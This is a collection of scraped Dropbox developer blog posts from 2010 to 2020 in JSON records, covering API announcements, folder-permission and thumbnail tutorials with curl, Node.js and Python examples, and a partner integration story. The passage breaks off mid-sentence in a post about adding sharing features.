{"website": "Dropbox", "title": "Announcing... API v1 Beta!", "author": ["Dropbox Api Team"], "link": "https://dropbox.tech/developers/announcing-api-v1-beta", "abstract": "It's been over a year since our last major update to the Dropbox API site. Version 0 was launched in July 2010 and has since run its course as our first baby step toward the great promise the API holds. The API team at Dropbox has been working hard for the past few months and it's now finally time to show you what we've been doing. Without further ado, we're pleased to announce that the API v1 beta is now open! There are a lot of things that have changed, but here are a few new v1 features we'd like to highlight: Official support for web apps. Reintroducing official support for \"app folders\" (formerly called \"sandboxes\") A totally revamped developers site with a new design, better documentation, and step-by-step tutorials to help you get started. New API calls, including improved file sharing and streaming, file name search, and support for file revisions. Improved upload options to handle possible conflicts and to avoid accidentally overwriting files. Improved security features, including a new single sign-on authorization flow for Android and iOS. Updated SDKs for iOS, Android, Python, Ruby, and Java that implement all of this new stuff, complete with comprehensive documentation. We want to give you, our forums developers, first crack at the new API. Check out our forums for more info: http://forums.dropbox.com/topic.php?id=44600 Please don't hesitate to send us feedback on anything from typos to server bugs. Can't wait to hear from you. - The API Team // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2011-09-15"},
{"website": "Dropbox", "title": "Update for developers writing desktop apps", "author": ["Dropbox Team"], "link": "https://dropbox.tech/developers/update-for-developers-writing-desktop-apps", "abstract": "Update from the future: This post is out of date and we now support desktop apps through the Core API . A quick note for desktop developers looking into the Dropbox API: we aren't yet officially supporting desktop applications. We've been focusing our efforts on improving the API for mobile and web apps. We have long-term plans for an official desktop API that we hope will make integrating Dropbox into the desktop much easier. The good news is, while we continue to ramp up API support, there are a couple of ways you can add Dropbox to your desktop apps. Authenticate using the OAuth web flow All authentication outside of mobile apps needs to authenticate using OAuth. Dropbox has full support for standard OAuth 1.0 libraries. Read our documentation (including endpoints) on the Dropbox Web App API documentation . This is the safest and most reliable method of accessing Dropbox. Read and write files directly to and from the Dropbox folder In a pinch, you can also take advantage of the syncing capabilities of the Dropbox desktop client apps by bypassing the API and reading/writing to and from the Dropbox folder. It's important to note that support of this method is intended for use with people running Dropbox desktop clients of versions 1.2 and below and will likely be deprecated in the future to make way for a more sophisticated Desktop API. If you have any questions about desktop integration, please email api-program@dropbox.com . // Tags Developers Tips Tricks Archive // Copy link Link copied Link copied", "date": "2011-07-08"},
{"website": "Dropbox", "title": "A few small changes", "author": ["Dropbox Team"], "link": "https://dropbox.tech/developers/a-few-small-changes", "abstract": "We've got some quick fixes lined-up to round out some of the edges on the API. First up: improvements to thumbnails and icons, all aimed at getting your apps looking good for prime time. You can now request PNG thumbnails , in addition to JPG thumbnails, via the /thumbnails call. Better error handling for badly formatted image files. Rather than returning a generic \"question mark\" image when we can't find a thumbnail or an image, you'll receive a proper error code . A ZIP file of Dropbox icons is now provided for your use. These are based on the same Silk icons Dropbox uses and their names match the icon attribute on files returned from /metadata . The next time you hear from us, we'll be talking about SDK improvements. After that? Well, we have some cool new calls on the drawing board that we're excited about, but we can't talk about just yet. Stay tuned! // Tags Developers Announcements Deprecated Thumbnail // Copy link Link copied Link copied", "date": "2010-10-27"},
{"website": "Dropbox", "title": "New Test Apps, iPhone SDK, and Documentation", "author": ["Dropbox Api Team"], "link": "https://dropbox.tech/developers/new-test-apps-iphone-sdk-and-documentation", "abstract": "The Dropbox developer team has been hard at work and today we have some exciting news to share about the Dropbox API. First off, we've opened the API to all mobile developers! Now when you register a new app, you are given a developer key by default. This key gives you an all-access pass to your own Dropbox account from within your mobile application. Once you've developed a working application ready for the public, simply apply for production status from the application's option page . Upon approval, your users will be able to access their own Dropbox accounts using your app. Please note, we are still only approving production keys for mobile apps for now. We plan to open up the API to web applications in the future, however we have yet to set a release date. We've also made a few other improvements to the Dropbox Developers website: A new SDK for iPhone , which now includes standardized UI elements for user sign-up and login New sample apps for iPhone and Android . Use these apps as a template for authentication or as an entry point for learning more about the SDK. Revamped documentation , which includes more detailed docs for the REST API including troubleshooting advice and error code descriptions. This is just a sample of the improvements we have on our drawing board. We're committed to continually making the Dropbox API better and easier to use. As always, if you have any feedback or questions, feel free to contact us . // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2010-07-21"},
{"website": "Dropbox", "title": "Dropbox API Updates", "author": ["Dropbox Team"], "link": "https://dropbox.tech/developers/dropbox-api-updates", "abstract": "We’ve got some great (and obvious) news, which is that we’ve just launched a new version of the Dropbox Developer website!  If you’ve been to the website before, you’ll notice that it’s now substantially different, and not just with looks.  Here’s a quick summary of the major changes: Developer App Keys As part of the new site, you no longer need to apply to get access to an App Key for testing purposes.  As of right now, you can go to the My Apps section and create an App with Developer status. Approval Process for Production Status In order for your App Key to work with all users and have a higher limit for API calls, it needs to be approved for Production status.  To apply for Production status, click the “Get Production Key” link on the options page for your app.  At this time, only mobile apps that run natively on the device are being approved.  Also, given the security concern associated with allowing you to access user files we need some proof that you’re going to behave well.  This could be a history of mobile app development, an email address showing you’re part of a reputable company, or a phone call where you come across as an especially competent and trusting person. New Documentation We’ve redone the Quick Start section based on your feedback, and we’ll continue to roll out improvements to the documentation over the next few days. If you have any thoughts or questions on this, let us know on the Support Section. // Tags Developers Announcements Deprecated // Copy link Link copied Link copied", "date": "2010-07-14"},
{"website": "Dropbox", "title": "The new /delta API call (beta)", "author": ["Kannan Goundan"], "link": "https://dropbox.tech/developers/the-new-delta-api-call-beta", "abstract": "From the very first release of the Dropbox API, developers have asked for ways to efficiently keep up with changes to files in Dropbox. Today we're releasing something that takes the API a step in that direction. The new /delta API call returns a list of delta entries that describe what has changed in a user's Dropbox, allowing the app to update its local state to match. The app stills need to poll periodically, but using /delta is much more efficient than using /metadata for tracking an entire folder hierarchy. We're releasing this in beta to get feedback. Things will probably change before the final release, so don't use it in production just yet. For now, it only works for app keys with \"Development\" status and only on App Folders. Some things to watch out for: /delta is a little trickier to use than our other API calls. Read the documentation closely. The list of delta entries is intended to help an app get its internal state caught up with the Dropbox server's state. We don't recommend showing it to the end user. For example, you may get entries out of order — the \"add\" entry for a file before the \"add\" entry for the file's parent folder. You may also get \"delete\" entries for files you don't have in your local state. Please use intelligent back-off for polling. While it'll be tempting to repeatedly poll /delta to get instant notification of changes, we'd appreciate polling intervals no less than 5 minutes on average. Below are updated copies of the Python, Ruby, and Java SDKs. Each SDK comes with a \"search cache\" example program that keeps a local cache of all the file names in an App Folder and uses /delta to keep the cache up to date. Python: tar.gz , zip , docs: DropboxClient.delta_beta . Ruby: tar.gz , zip , docs: DropboxClient.delta_beta . Java: tar.gz , zip , docs: DropboxAPI.deltaBeta . Give it a try. If something doesn't work or is confusing, let us know on the forum thread . // Tags Developers V1 Announcements Deprecated // Copy link Link copied Link copied", "date": "2012-02-08"},
{"website": "Dropbox", "title": "A single call for metadata and file content", "author": ["Ramesh Balakrishnan"], "link": "https://dropbox.tech/developers/a-single-call-for-metadata-and-file-content", "abstract": "Until now, retrieving a file’s metadata and its content required two API calls - one to retrieve the metadata and another to get the file’s contents at the revision indicated in the metadata. We recently updated the /files REST API call to start returning the file’s metadata in a special header ( x-dropbox-metadata ) in the HTTP response. Accordingly, we extended all the official SDKs to expose the metadata along with the file’s contents when a client requests a file download. We also made a similar change to the /thumbnails call (and added corresponding methods to the SDKs) that returns the metadata for the file whose thumbnail is being requested. Please refer to the CHANGELOGs and documentation on each SDK for details on the new interfaces. These changes should make your client code simpler (especially if revision number isn’t important to you) and more efficient (one network call, instead of two). We will be deprecating older interfaces in a future release (with ample lead time). Python get_file_and_metadata() / thumbnail_and_metadata() supersede get_file() / thumbnail() Ruby get_file_and_metadata() / thumbnail_and_metadata() supersede get_file() / thumbnail() iOS DBRestClient.m now contains new loadedFile() / loadedThumbnail() callbacks that also include the metadata, superseding older callbacks. Java DropboxAPI.DropboxFileInfo now supports getMetadata() (nothing to deprecate). Stay tuned to our developers site and follow @dropboxapi on Twitter for future updates. // Tags Developers Announcements Thumbnail Files // Copy link Link copied Link copied", "date": "2012-01-19"},
{"website": "Dropbox", "title": "Test your apps with up to five users", "author": ["Chris Varenhorst"], "link": "https://dropbox.tech/developers/test-your-apps-with-up-to-five-users", "abstract": "A number of you have noticed that there was something missing in our API development process : testers. Until today, only one user could use an app while it was in development. Now, you can allow up to five other users. With additional users, you can share an app with a few friends, finally test sharing, or ship it off to your QA team. To enable the new feature, view your app's Options page from My Apps . You'll see a new section named Additional users . Click Enable additional users to turn it on. Now, feel free to send the app to up to five users. Once someone uses your app's Dropbox functionality, the email address associated with their Dropbox account will appear here. You can disable access at any time by returning to this page and clicking the Remove next to their email. Once your app is fully baked, please remember to apply for production status before you release it to the world. Applying for production status gives us a chance to ensure your app works well with the API and follows our guidelines, and approval opens up your app's API access to unlimited users. // Tags Developers Announcements // Copy link Link copied Link copied", "date": "2012-01-14"},
{"website": "Dropbox", "title": "How Otter.ai integrated with Dropbox to streamline transcription of media", "author": ["Taylor Krusen"], "link": "https://dropbox.tech/developers/how-otter-ai-integrated-with-dropbox-to-streamline-transcription-of-media", "abstract": "What Otter.ai does Why Otter.ai integrated with Dropbox How Otter.ai integrated with Dropbox Reflecting on the Dropbox integration Otter.ai creates AI-powered speech-to-text and speaker identification technology, as well as an app for capturing and sharing meeting notes. Otter.ai worked with Dropbox to develop an integration that simplifies creative teams’ workflows by automating the tedious task of transcription. We asked Simon Lau , VP of Product at Otter.ai, to write a guest post on our developer blog, sharing why and how Otter.ai integrated with Dropbox on their journey to accelerate the future of work. Scroll on to read Simon’s contribution . What Otter.ai does Otter.ai is the maker of Otter Voice Meeting Notes , a cloud-based AI note-taking and collaboration app that captures and shares meeting notes live . It automatically transcribes live recordings and imported files, extracts keywords, and even identifies speakers. Users can search and play back the audio-synced-with-text transcripts, edit and annotate with highlights, photos, and comments, as well as organize and share the conversations. Otter Voice Meeting Notes for iOS, Android, and Web Our customers range from individual freelancers to small businesses to larger enterprises. With the launch of our iOS , Android , and Web apps in February 2018, we have seen a wide range of use cases for business meetings, interviews, qualitative research, education, podcasting, and live events. Why Otter.ai integrated with Dropbox Let’s face it. Transcribing interviews is the least favorite part of the job of many journalists, writers, and media producers. It is tedious, boring, and even dreadful, especially if you don’t like listening to your own voice. Creative teams can stay focused on storytelling and finish projects faster if they can have audio recordings and video footage transcribed automatically. “Media teams are among the most active Dropbox users, creating and saving more than a billion files in 2017 alone,” as noted in a blog post by Dropbox . At Otter.ai, we have built one of the most advanced and accurate speech-to-text and speaker identification engines in the market to power our app, Otter Voice Meeting Notes. It was a no brainer for us to partner with Dropbox to develop an integration that simplifies the workflows of media teams. How Otter.ai integrated with Dropbox For our initial integration, we set out to create a user experience that is easy and frictionless while keeping our implementation simple. So we decided to go with the approach where Otter automatically transcribes anytime users move files into a dedicated App Folder in Dropbox. Animation of a media file being automatically transcribed in Dropbox by using the Otter.ai integration In a nutshell, our integration consists of the following steps: We first need to ask users to authorize the Otter app to access their Dropbox, following the Dropbox API OAuth guide . Once connected, Dropbox creates a dedicated “Otter” App Folder under Dropbox > Apps. Via Dropbox webhooks , Otter gets real-time notifications whenever files changed in the “Otter” App Folder. Otter transcribes any new audio and video files detected and saves the transcripts back to the “Otter” App Folder. Check out our blog post and video demo of the Otter integration with Dropbox. Reflecting on the Dropbox integration The Dropbox API Framework and DBX Platform are easy to use, and the documentation was straightforward and helpful in our initial launch. We did encounter some minor difficulties in testing the webhooks integration, but the Dropbox developer support team helped us troubleshoot the issue to resolution. Today, this automatic transcription feature is one of the most popular integrations among Otter and Dropbox users. We’re excited to see where we can expand support for our users in the future. We hope you enjoyed this guest blog contribution from Simon Lau at Otter.ai and that it gave you some ideas of how you can build or enhance your own Dropbox integration. To learn more about Otter.ai , follow @Otter_ai or @_SimonLau , or contact the Otter.ai team directly at support@otter.ai. See what is possible with the Dropbox API and build with Dropbox today at www.dropbox.com/developers . // Tags Developers Media Partners AI Automation Developer Spotlight // Copy link Link copied Link copied", "date": "2020-02-04"},
{"website": "Dropbox", "title": "Implementing restricted access with nested permissions and folders", "author": ["Tahsin Islam"], "link": "https://dropbox.tech/developers/implementing-restricted-access-with-nested-permissions-and-folders", "abstract": "What does it mean for a folder to have restricted access? How do I restrict access to a folder? How do I restore parent folder members? Use Cases Common Questions Best practices for large deployments Sharing with the Dropbox API Dropbox (and the Dropbox API) has recently expanded the flexibility of our permissions model by adding the ability for Dropbox Business users to create folders that have a more restricted audience than their parent folders. This is perfect for cases where you want a sub-folder to have a smaller audience* than its parent folder. *Note: this article is focused on restricted access use cases, but it is possible to create sub-folders that have more shares than a parent folder. In this article, we’ll cover details of what it means to restrict folder permissions, how to edit those permissions using the Dropbox API, and run through some common use cases. What does it mean for a folder to have restricted access? Restricting access to a folder in the Dropbox user interface By default, new shared folders inside a team folder inherit their share settings. However, folders with restricted access do not inherit member access from their parent folder, and can instead be set to a more limited audience. Once the inheritance has been broken, you can add specific individual members or groups to customize who has access (and at what level) to the specific sub-folder. These types of restricted folders can only be created inside team folders. Note: the “Dropbox Web” instructions in this article are meant to help follow along, but are subject to change. For official instructions please refer to the restrict folder access help center article . How do I restrict access to a folder? New Folder Dropbox Web : Inside a team folder, click on “New folder” from the web page, and select the “Specific people” option from the subsequent modal pop up. Dropbox API : Using the /sharing/share_folder endpoint you can designate a path and name for the new folder (one will be created if the path is not found). Setting access_inheritance to no_inherit will ensure the resulting folder is created without any inherited permissions. You can then customize who has access to the folder with /sharing/add_folder_member, which accepts a dropbox_id for an account, team member, or a group. Existing Folders Dropbox Web : From the sharing modal you can restrict access by removing the inherited members of the parent folder. You can either remove all* the inherited members of the parent folder at once, or remove one inherited user/group at a time. Remove all inherited members (click “Remove”) Removing a single inherited group/user Dropbox API : Use the /sharing/set_access_inheritance endpoint to pass in the shared_folder_id and no_inherit for the access_inheritance parameter. Once executed, this breaks the inherited permissions from the parent folder and removes all* current groups and individuals with access to the folder. From here you can assign a custom permission set by calling sharing/add_folder_member and adding specific groups or people. *Currently you cannot remove inherited members from an existing folder with 100+ members. How do I restore parent folder members? Dropbox Web : Inherited members can be restored by clicking on “share with members” in the gray banner. Once parent folder members are restored, the folder no longer has restricted access. Restoring inherited permissions to a folder nested in a team folder Dropbox API: Executing the sharing/set_access_inheritance endpoint with the shared_folder_id and and passing the setting inherit will restore all inherited parent folder members. Use Cases Now that we have a good overview of how nested permissions and restricted folders work, let’s dive into an implementation scenario with the Dropbox API. Imagine you’re an admin for a media company. You’re setting up a secret new project folder for one of your existing clients. Because the client’s product launch is highly-confidential, only certain members of the existing client team will be working on this new project. You want to make sure all client assets are organized under the right hierarchy but want to limit who has access to the specific project folder to keep the launch under wraps. Fortunately, restricted folder permissions allow you to do exactly that. Creating your folder Create the project folder underneath the client folder and restrict permissions using the /sharing/share_folder endpoint. Copy curl -X POST https://api.dropboxapi.com/2/sharing/share_folder \\\r\n    --header \"Authorization: Bearer <team_file_access_token> \" \\\r\n    --header \"Content-Type: application/json\" \\\r\n    --header \"Dropbox-API-Select-Admin: dbmid:AACf3TCu4HhXLhlYmfbrWnV3AvkQ-0oxCLp\" \\\r\n    --data \"{\\\"path\\\": \\\"/Client X/Secret Project Folder\\\",\r\n        \\\"acl_update_policy\\\": \\\"editors\\\",\r\n        \\\"force_async\\\": false,\r\n        \\\"member_policy\\\": \\\"team\\\",\r\n        \\\"shared_link_policy\\\": \\\"members\\\",\r\n        \\\"access_inheritance\\\": \\\"no_inherit\\\"}\" While you also have more granular options for setting folder policies, setting access_inheritance to no_inherit in this context will create a folder with restricted access that does not mirror parent permissions. Providing a path that does not already exist will create the folder specified, otherwise it will create a new share for the existing path and return a shared_folder_id . Setting permissions Next we want to grant access to the secret project folder for a specific client team (already set up as a Dropbox Group ). First, let’s grab the shared_folder_id from the return of the above call or using /files/get_metadata . From here you can pass in the shared_folder_id and specify a dropbox_id to grant access to a specific group of team members with the /sharing/add_folder_member endpoint. In this example, the secret client team has already been added to a group, and we’re adding that group to the folder with the group’s dropbox_id . Although we’re adding a group in this call, a dropbox_id could belong to a Dropbox account, individual team member, or a group. Copy curl -X POST https://api.dropboxapi.com/2/sharing/add_folder_member \\\r\n    --header \"Authorization: Bearer <team_file_access_token>\" \\\r\n    --header \"Content-Type: application/json\" \\\r\n    --header \"Dropbox-API-Select-Admin: dbmid:AACf3TCu4HhXLhlYmfbrWnV3AvkQ-0oxCLp\" \\\r\n    --data \"{\\\"shared_folder_id\\\": \\\"6448417792\\\",\r\n            \\\"members\\\": [{\\\"member\\\": \r\n              {\\\".tag\\\": \\\"dropbox_id\\\",\r\n              \\\"dropbox_id\\\": \\\"g:76264835542b7610000000000000219e\\\"},\r\n              \\\"access_level\\\": \\\"editor\\\"}],\r\n              \\\"quiet\\\": true}\" Adjusting permissions Oh no! You accidentally added the wrong members to your restricted folder. No worries, first let’s look at all the current folder members with /sharing/list_folder_members . Then we can decide what groups or members to remove. Copy curl -X POST https://api.dropboxapi.com/2/sharing/list_folder_members \\\r\n    --header \"Authorization: Bearer <team_file_access_token>\" \\\r\n    --header \"Content-Type: application/json\" \\\r\n    --header \"Dropbox-API-Select-Admin: dbmid:AACf3TCu4HhXLhlYmfbrWnV3AvkQ-0oxCLp\" \\\r\n    --data \"{\\\"shared_folder_id\\\": \\\"6448417792\\\",\r\n            \\\"actions\\\": []}\" Once you’ve identified the group or member you want to remove, from the response of the /sharing/list_folder_members call, you can go ahead and use /sharing/remove_folder_member . Make sure to pass in the relevant dropbox_id of members (or groups) that you want to remove and the shared_folder_id for the target folder. Copy curl -X POST https://api.dropboxapi.com/2/sharing/remove_folder_member \\\r\n    --header \"Authorization: Bearer <team_file_access_token>\" \\\r\n    --header \"Content-Type: application/json\" \\\r\n    --header \"Dropbox-API-Select-Admin: dbmid:AACf3TCu4HhXLhlYmfbrWnV3AvkQ-0oxCLp\" \\\r\n    --data \"{\\\"shared_folder_id\\\": \\\"6448417792\\\",\r\n            \\\"member\\\": {\\\".tag\\\": \\\"dropbox_id\\\",\r\n            \\\"dropbox_id\\\": \\\"g:76264835542b7610000000000000219e\\\"},\r\n            \\\"leave_a_copy\\\": false}\" Restoring permissions Great, now the project team has had time to successfully execute their project in secret. They’ve delivered the project, the client loved it, the product was launched, and now you want to restore the default permissions so the rest of the client team can leverage the great work they did! You can do this by calling /sharing/set_access_inheritance and passing in inherit . This will revert permissions back to the defaults of the parent folder. Copy curl -X POST https://api.dropboxapi.com/2/sharing/set_access_inheritance \\\r\n    --header \"Authorization: Bearer <team_file_access_token>\" \\\r\n    --header \"Content-Type: application/json\" \\\r\n    --header \"Dropbox-API-Select-Admin: dbmid:AACf3TCu4HhXLhlYmfbrWnV3AvkQ-0oxCLp\" \\\r\n    --data \"{\\\"shared_folder_id\\\": \\\"6448417792\\\",\r\n            \\\"access_inheritance\\\": \\\"inherit\\\"}\" Common Questions Who can restrict access to a folder? Any member of the team can restrict access to a folder, as long as they have the ability to manage membership of that folder. What error messages do users see when accessing a restricted folder? An admin sees this error A user sees this error How is this feature visible in Dropbox? Icon Meaning A user who does not have access to a folder in a team folder will see this icon on all surfaces. A user who does not have access to a folder in a team folder, but is added to one or more subfolders, will see this icon on all surfaces. They can click into this folder to get to the subfolders they have access to, but they will not see other content in this folder. A user who has access to a folder within a team folder will see this icon on all surfaces. Best practices for large deployments ⚠️ Avoid creating multiple folders with restricted access at the same time. Nothing will break, but you may encounter a namespace lock contention . - E.g. Avoid using our APIs to mass-create folders with restricted access in the same folder tree. ⚠️ Continue to adhere to our guidance that a team should not have more than 10,000 shared folders. A folder you restrict access to is always a shared folder. Dropbox performance may decline for teams with over 10,000 shared folders. ⚠️ Try to keep team folders flat when possible, rather than having deeply nested sharing structures. Dropbox performance may decline for large teams with deeply nested structures. ⚠️ Don’t restrict access to folders with 100+ members. Nothing will break, but you will see a generic error message. An interim workaround is to create a new restricted folder and move the contents of an existing folder into the newly created folder. Sharing with the Dropbox API In this article, we covered what it means to restrict folder permissions, how to edit those permissions (in the Dropbox user interface and the Dropbox API), discussed a real world use case, and gave some context for working with larger scale deployments. Between this post, ‘ 3 ways to add Sharing to your Dropbox App ’, and ‘ Manage team sharing in your Dropbox App ’, we’ve covered many Dropbox Sharing concepts and how to incorporate them into your own integration. Armed with this new knowledge you can move beyond simple file storage to collaboration and administration. We can’t wait to see what you build! See what’s possible with the Dropbox API and find other ways to automate your work. Build with Dropbox today at www.dropbox.com/developers // Tags Developers Announcements Sharing Curl Tips and Tricks New Feature Business Endpoints // Copy link Link copied Link copied", "date": "2019-12-11"},
{"website": "Dropbox", "title": "Scaling down large image files using the get thumbnail API", "author": ["Ruben Rincon"], "link": "https://dropbox.tech/developers/scaling-down-large-image-files-using-the-get-thumbnail-api", "abstract": "Using the get_thumbnail API Testing the API with some image samples Node.JS script to scale down images within a Dropbox folder Where to go from here As digital cameras evolve, including the ones in our smartphones, photos produced by them constantly increase in resolution and file size. For instance, on my current smartphone, the average file size of pictures goes between 6-8 MB, when the ones produced by my 3-year-old smartphone average 2-3 MB. Having a large file size is not a problem when previewing images directly in the Dropbox website or the Dropbox mobile apps as these surfaces are optimized for large files, but presents challenges when interacting with other APIs. If you’re transferring your images to a third party API for processing (like an image recognition AI), you can easily hit their size limits if you’re uploading large files. Additionally, scaling images down to a smaller size and resolution will significantly reduce upload and processing time for those API tools. The Dropbox API offers a solution for this with our get_thumbnail API. In this article, we will cover how to: Use the get_thumbnail API on a conceptual level Test the API with a few image samples Scale down images within a Dropbox folder using a script written with Node.js and the Dropbox JavaScript SDK Using the get_thumbnail API The Dropbox API offers a great way to retrieve scaled down images with the get_thumbnail and get_thumbnail_batch APIs. These APIs offer several options to get a scaled down version of any image that is smaller than 20MB and that has any of these formats: jpg, jpeg, png, tiff, tif, gif and bmp. When you use these APIs, the files in Dropbox are not modified, but you get in the response the bits for images according to the parameters in the request. Looking at the API documentation for get_thumbnail , there are three important parameters that you need to pass in your request: format , size , and mode . format : refers to the format you want the output to be, which can be jpeg or png. size : defines the final resolution of the image. There is a predefined range of options that go between 32 by 32 px to 2048 by 1536 px. You can find all the options in the API documentation for get_thumbnail . mode : defines how images are scaled down. It can have any of the following three values: strict - Scale down the image to fit within the given size bestfit - Scale down the image to fit within the given size or its transpose fitone_bestfit - Scale down the image to completely cover the given size or its transpose Testing the API with some image samples Let’s test the API using different parameters for two photos that I took with my current smartphone from a hidden gem in Silicon Valley in both portrait and landscape orientations. We will use 2048x1536 as the size parameter since at the time of writing, it’s the largest file size you can get with the get_thumbnail API. Portrait: 3024×4032 px 5.3 MB Landscape: 4032×3024 px 5.7MB Results for the portrait image with 3024×4032 px, file size 5.3MB and 3:4 aspect ratio: Parameters Final Dimensions (w x h) Final aspect ratio Final Size w2048h1536 strict 1152 × 1536 3:4 438 KB w2048h1536 bestfit 1536 × 2048 3:4 759 KB w2048h1536 fitone_bestfit 2048 × 2731 3:4 1.3 MB Results for the landscape image with 4032×3024 px, file size 5.7MB and 4:3 aspect ratio: Parameters Final Dimensions (w x h) Final aspect ratio Final Size w2048h1536 strict 2048 × 1536 4:3 839 KB w2048h1536 bestfit 2048 × 1536 4:3 839 KB w2048h1536 fitone_bestfit 2731 × 2048 4:3 1.4 MB You notice that in the result for both orientations, fitone_bestfit produced the highest quality image and strict the lowest one. You can see how the size of the file has been significantly reduced and now it should be possible to use this file with most services. Also notice that in no case was the aspect ratio of the image modified. You may wonder, what happens when you try to get the thumbnail specifying dimensions that are higher than the original file? Let’s try this with a much smaller original image. Results for an image with 768×1024 px, file size 211KB and 3:4 aspect ratio: Parameters Final Dimensions (w x h) Final aspect ratio Final Size w2048h1536 strict 768 × 1024 3:4 211 KB w2048h1536 bestfit 768 × 1024 3:4 211 KB w2048h1536 fitone_bestfit 768 × 1024 3:4 211 KB So basically, independently of the parameters, as long as the requested size isn’t smaller than the original in any dimension, we will get the original size, but at the very least could help you to change the file format if you need so. A note of caution. When you get a thumbnail using the API, the response will contain a subset of the file metadata with it (such as location and time when the photo was taken), but none of the original metadata will be copied onto the new file. You can see this in the below snapshot where I compare the metadata displayed by Finder for both the original (left) and the final (right) images. Metadata in original (left) and thumbnail (right) images Metadata in original (left) and thumbnail (right) images If you are interested in exploring more this API, you can easily test different parameters using the Dropbox API Explorer . Node.JS script to scale down images within a Dropbox folder Now let’s see some code. With the above information at hand I’m going to show you a script that scales down all the images in a specified folder that are over a specified size limit and then moves the originals to a nested folder (so no data is lost), but with the benefit that when the script finishes running, all the images at the current folder level will be below the file size limit. Note : in order to run the script, you’ll need a Dropbox access token. To quickly follow along, you can copy a short-lived token from the API Explorer . When building an integration, do not use this token. Instead, pick an approach below to obtain an access token. - First time building a Dropbox app ? Our Getting Started guide will walk you through app setup to an access token you can use in your integration. - Do your users need to interact with their Dropbox data ? Head over to our OAuth guide for information on how to build an OAuth Flow. There’s also a blog post with a sample OAuth Flow implementation in Node.js. The behavior of this script is shown in the below flowchart: Flowchart overview of the sample script used in article An important thing to consider is that the thumbnail data makes a roundtrip to the machine running the script. Technically, we could simplify the above flow by using the batch thumbnail download, but this will create potentially large responses from Dropbox so it is better suited when you request small images or for backend processing. For the script, we will use Node.JS and the Dropbox JavaScript SDK . A Node.JS version higher than 8.3 is required. To run the script follow these steps: 1. Install Node.JS 2. In a directory, create an empty file named scaledownimgscript.js 3. Copy and paste the contents of this GitHub file into your scaledownimgscript.js file 4. Update the following variables: DROPBOX_ACCESS_TOKEN , FOLDER_PATH , FORMAT , SIZE , MODE , SIZE_LIMIT (optional – controls the size of images filtered out) 5. In the same folder where you have the script, run the following two commands: npm install dropbox isomorphic-fetch node -e 'require(\"./scaledownimgscript\").run()' The script will run and show a message in terminal every time that an image is scaled down and the original gets moved. Where to go from here The Dropbox API has many hidden gems like the get_thumbnail endpoint that can help you improve your integration. If you discover your own or want us to cover something specific, then please reach out on the Dropbox API Twitter or the Developer Forums . For more Dropbox tutorials and technical guides, check out our previous blog posts or developer reference page . Build with Dropbox today at www.dropbox.com/developers // Tags Developers User endpoints Images JavaScript Thumbnail Files Tips and Tricks // Copy link Link copied Link copied", "date": "2019-07-25"},
{"website": "Dropbox", "title": "3 ways to add sharing to your Dropbox App", "author": ["Taylor Krusen"], "link": "https://dropbox.tech/developers/3-ways-to-add-sharing-to-your-dropbox-app", "abstract": "Prepare Your Environment Create Shared Links Set View-only Access for Shared Files Create Shared Folders Automate Your Link, File, and Folder Sharing Storing personal files in Dropbox is useful, but collaborating with others can make you even more effective. Whether for your business, school, or personal projects, Dropbox sharing can create more engaging work. There are a number of ways to incorporate shared files and folders with Dropbox. Each method can be accessed with the Dropbox API, allowing your app to automatically add the right people to your projects. In this post, we’ll use the Dropbox API to implement sharing in three ways. The code samples use the Dropbox Python SDK, but you could use any SDK (or make direct API calls). Prepare Your Environment In order to get started, you’ll need the Dropbox Python SDK and an access token for your Dropbox App if you don’t already have one. You can create an app from the App Console and get your own access token in the app settings. If you don’t have a Python environment setup, then you can follow along with the set up instructions in our Getting Started guide. Now you have everything you need to begin. In a new file, import the Dropbox Python SDK, enter your access token, and create a variable with the Dropbox object: Copy import dropbox\r\ntoken = 'your_access_token'\r\ndbx = dropbox.Dropbox(token) Create Shared Links Imagine you’re a professor at a local university. It’s your department’s thesis presentation day and you’re recording all of the student’s talks so they have the opportunity to evaluate themselves later. Half hour videos are too large in size to send to them over email, but because you automatically backup your videos to Dropbox there is a way to share these videos to the students in a streamlined fashion: Here’s how to create a shared link * with the Dropbox API: Copy def creating_shared_link_no_settings(path):\r\n    link = dbx.sharing_create_shared_link_with_settings(path)\r\n    print(link.url)\r\n \r\ncreating_shared_link_no_settings(\"/students/Amy/video.mp4\") *Note that the /sharing/create_shared_link_with_settings endpoint is used with no settings to create a basic shared link. The link is subject to a team’s sharing policy on Dropbox Business accounts. Besides the inherent simplicity of a link, it also provides some extra flexibility in how the content is shared. Keeping with our educator example; let’s say you have a presentation video of a student in your research group. You can post the link on your research group’s website or your chat group, giving you the ability to share the video with undefined groups quickly. There are many reasons to create a shared link , including sharing the same files with multiple people or wanting to give view-only access. Additionally, the recipient of the link does not need a Dropbox account in order to view the file. Configure your Shared Link Perhaps you want to post the link to the video on your faculty website so all the members of your department can view it, but you want to respect the student’s privacy and not just let anyone view it. By creating a password, you can ensure that if the video is shared more broadly, only the intended audience can access it. Copy def creating_shared_link_password(path, password):\r\n    link_settings = dropbox.sharing.SharedLinkSettings(\r\n        requested_visibility =\r\n        dropbox.sharing.RequestedVisibility.password,\r\n        link_password=password,\r\n        #expires=datetime.datetime.utcnow() + datetime.timedelta(hours=24)\r\n    )\r\n    link = dbx.sharing_create_shared_link_with_settings(path, settings=link_settings)\r\n    print(link.url)\r\n \r\ncreating_shared_link_password('/students/Amy/video.mp4','password') The code is similar to the previous sample, but here you’re adding parameters to configure the shared link’s settings . The visibility is set to require a password and you supply the link password separately. Optionally, you can also set an expiration (commented out in the code), but you’ll need to import Python’s datetime library . Set View-only Access for Shared Files You know the students in your class have Dropbox accounts because the university provides them during enrollment. For a simulated business negotiation exercise, you’d like to grant view-only access to specific files on a per student basis using their emails. You should take advantage of view-only file access. Sharing a file for view-only access is more secure as the recipient must be authenticated with Dropbox to view the file. As the sharer, you’re able to verify whether the recipient, or student in our example, has viewed the file. Additionally, shared files make it easier to collaborate because the student is already logged in and can leave comments. Give your students view-only file access using Dropbox’s sharing/add_file_member endpoint. Be sure to add a message so they know what the file is. Copy member = dropbox.sharing.MemberSelector.email('Amy@college.edu')\r\ndbx.sharing_add_file_member('/2019/Students/Amy_Thesis.mp4', [member], \"Here's your thesis video.\") Note: the recipient must have a Dropbox account in order to view the file. Along with the video, perhaps you’d like to include feedback of your student’s presentation. Instead of sharing a file, you can share an entire folder. Create Shared Folders While files can only have viewers , folders can have editing privileges for certain people–allowing others to add onto that feedback. For example, perhaps another professor wants to add their feedback alongside yours. You can share resources with them by 